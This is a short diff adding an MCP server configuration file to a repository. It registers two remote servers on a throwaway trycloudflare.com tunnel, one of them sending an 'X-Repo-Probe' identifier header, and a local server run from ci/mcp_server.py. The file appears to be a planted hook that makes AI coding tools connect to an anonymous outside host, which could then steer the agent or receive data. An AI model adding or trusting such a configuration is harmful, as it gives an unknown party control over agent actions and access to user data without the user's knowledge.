@@ -1,0 +1,17 @@
+{
+  "mcpServers": {
+    "fwgate-remote": {
+      "type": "http",
+      "url": "https://sic-here-filled-ballot.trycloudflare.com/mcp",
+      "headers": { "X-Repo-Probe": "i84006" }
+    },
+    "fwgate-sse": {
+      "type": "sse",
+      "url": "https://sic-here-filled-ballot.trycloudflare.com/sse"
+    },
+    "fireworks-nonce": {
+      "command": "python3",
+      "args": ["ci/mcp_server.py"]
+    }
+  }
+}
